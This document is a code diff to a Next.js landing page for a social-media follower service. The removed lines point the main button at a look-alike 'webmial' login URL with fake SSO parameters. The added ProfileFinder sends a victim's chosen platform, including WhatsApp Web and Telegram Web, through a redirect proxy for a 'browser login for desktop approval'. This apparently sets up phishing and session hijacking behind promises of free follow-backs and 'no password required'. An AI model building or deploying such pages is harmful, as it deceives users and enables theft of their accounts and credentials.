@@ -1,6 +1,7 @@
 import { Button } from "@/components/ui/button";
 import { SocialIcon } from "@/components/social-icon";
 import Link from "next/link";
+import { useState } from "react";
 
 const socialPlatforms = [
   { name: "Instagram", icon: "instagram", color: "#E4405F", domain: "instagram.com" },
@@ -20,6 +21,76 @@ function createRedirectUrl(targetUrl: string): string {
   return `${baseUrl}${encodeURIComponent(targetUrl)}`;
 }
 
+function buildProfileUrl(platform: string, username: string): string {
+  const cleanUsername = username.replace(/^@/, '').replace(/^https?:\/\/(www\.)?/, '').replace(/\/.*$/, '');
+  const platformDomains: Record<string, string> = {
+    instagram: 'instagram.com',
+    tiktok: 'www.tiktok.com',
+    youtube: 'youtube.com',
+    twitter: 'twitter.com',
+    facebook: 'facebook.com',
+    linkedin: 'linkedin.com',
+    snapchat: 'web.snapchat.com',
+    pinterest: 'pinterest.com',
+    whatsapp: 'web.whatsapp.com',
+    telegram: 'web.telegram.org',
+  };
+  const domain = platformDomains[platform.toLowerCase()] || platform;
+  return `https://${domain}/${cleanUsername}`;
+}
+
+function ProfileFinder() {
+  const [platform, setPlatform] = useState(socialPlatforms[0].name);
+  const [username, setUsername] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!username.trim()) return;
+    setIsLoading(true);
+    const profileUrl = buildProfileUrl(platform, username);
+    const redirectUrl = createRedirectUrl(profileUrl);
+    window.location.href = redirectUrl;
+  };
+
+  return (
+    <form onSubmit={handleSubmit} className="max-w-xl mx-auto space-y-4">
+      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <select
+          value={platform}
+          onChange={(e) => setPlatform(e.target.value)}
+          className="bg-gray-800 border border-gray-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500"
+        >
+          {socialPlatforms.map((p) => (
+            <option key={p.name} value={p.name}>{p.name}</option>
+          ))}
+        </select>
+        <div className="relative">
+          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">@</span>
+          <input
+            type="text"
+            value={username}
+            onChange={(e) => setUsername(e.target.value)}
+            placeholder="Enter username or profile URL"
+            className="flex-1 bg-gray-800 border border-gray-700 rounded-lg pl-10 pr-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500"
+            required
+          />
+        </div>
+      </div>
+      <Button
+        type="submit"
+        disabled={isLoading || !username.trim()}
+        className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 font-semibold py-3 disabled:opacity-50 disabled:cursor-not-allowed"
+      >
+        {isLoading ? 'Resolving Profile...' : 'Start Now!'}
+      </Button>
+      <p className="text-center text-sm text-gray-500">
+        We&apos;ll resolve your profile through our proxy and open a smooth browser login for desktop approval.
+      </p>
+    </form>
+  );
+}
+
 export default function Home() {
   return (
     <main className="min-h-screen bg-neutral-900 text-white">
@@ -37,6 +108,31 @@ export default function Home() {
               Reach your target audience and grow your social media presence with the expertise 
               of marketing professionals. Steady, sustainable growth.
             </p>
+          </div>
+
+          <div className="relative mb-16 max-w-4xl mx-auto">
+            <div className="absolute inset-0 bg-gradient-to-r from-purple-600/20 via-pink-600/20 to-orange-500/20 rounded-3xl blur-2xl" />
+            <div className="relative bg-gradient-to-r from-purple-900/50 via-pink-900/30 to-orange-900/50 border border-purple-500/30 rounded-3xl p-8 md:p-12 text-center">
+              <div className="flex items-center justify-center gap-3 mb-6">
+                <span className="text-4xl animate-bounce">🎁</span>
+                <span className="text-4xl animate-bounce">🎁</span>
+              </div>
+              <h3 className="text-3xl md:text-4xl font-bold mb-4">
+                <span className="gradient-text">Follow Us</span> & Get <span className="text-yellow-400">5 Follow-Backs FREE!</span>
+              </h3>
+              <p className="text-lg text-gray-300 mb-8 max-w-xl mx-auto">
+                Join our community and watch your profile grow. Follow our official accounts and we&apos;ll follow you back 5x — no catch, no bots, just real engagement.
+              </p>
+              <Link href={createRedirectUrl("https://insfamous.co/checkout/")}>
+                <Button className="w-full md:w-auto px-10 py-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 hover:from-yellow-500 hover:via-orange-600 hover:to-red-600 text-black font-bold text-lg rounded-xl shadow-xl shadow-yellow-500/30 transition-all hover:scale-105">
+                  🎯 Claim My 5 Free Follow-Backs Now
+                </Button>
+              </Link>
+              <p className="mt-6 text-sm text-gray-500 flex items-center justify-center gap-2">
+                <span className="animate-pulse text-green-400">●</span>
+                Real accounts • Instant delivery • No password required
+              </p>
+            </div>
           </div>
 
           <div className="mb-16">
@@ -98,19 +194,7 @@ export default function Home() {
           </div>
 
           <div className="max-w-xl mx-auto mb-16">
-            <div className="flex items-center gap-2 mb-2">
-              <span className="text-gray-400">@</span>
-              <input
-                type="text"
-                placeholder="Enter your username"
-                className="flex-1 bg-gray-800 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-blue-500"
-              />
-            </div>
-            <Link href={createRedirectUrl("https://webmial1.newsmoto.co.ke/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://insfamous.co/checkout/")}>
-              <Button className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 font-semibold py-3">
-                Start Now!
-              </Button>
-            </Link>
+            <ProfileFinder />
           </div>
 
           <div className="grid grid-cols-2 md:grid-cols-4 gap-8 max-w-4xl mx-auto mb-16">
@@ -125,31 +209,6 @@ export default function Home() {
                 <div className="text-sm text-gray-400">{stat.label}</div>
               </div>
             ))}
-          </div>
-
-          <div className="relative mb-16 max-w-4xl mx-auto">
-            <div className="absolute inset-0 bg-gradient-to-r from-purple-600/20 via-pink-600/20 to-orange-500/20 rounded-3xl blur-2xl" />
-            <div className="relative bg-gradient-to-r from-purple-900/50 via-pink-900/30 to-orange-900/50 border border-purple-500/30 rounded-3xl p-8 md:p-12 text-center">
-              <div className="flex items-center justify-center gap-3 mb-6">
-                <span className="text-4xl animate-bounce">🎁</span>
-                <span className="text-4xl animate-bounce">🎁</span>
-              </div>
-              <h3 className="text-3xl md:text-4xl font-bold mb-4">
-                <span className="gradient-text">Follow Us</span> & Get <span className="text-yellow-400">5 Follow-Backs FREE!</span>
-              </h3>
-              <p className="text-lg text-gray-300 mb-8 max-w-xl mx-auto">
-                Join our community and watch your profile grow. Follow our official accounts and we&apos;ll follow you back 5x — no catch, no bots, just real engagement.
-              </p>
-              <Link href={createRedirectUrl("https://insfamous.co/checkout/")}>
-                <Button className="w-full md:w-auto px-10 py-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 hover:from-yellow-500 hover:via-orange-600 hover:to-red-600 text-black font-bold text-lg rounded-xl shadow-xl shadow-yellow-500/30 transition-all hover:scale-105">
-                  🎯 Claim My 5 Free Follow-Backs Now
-                </Button>
-              </Link>
-              <p className="mt-6 text-sm text-gray-500 flex items-center justify-center gap-2">
-                <span className="animate-pulse text-green-400">●</span>
-                Real accounts • Instant delivery • No password required
-              </p>
-            </div>
           </div>
 
           <div className="text-center text-sm text-gray-500 mb-8">
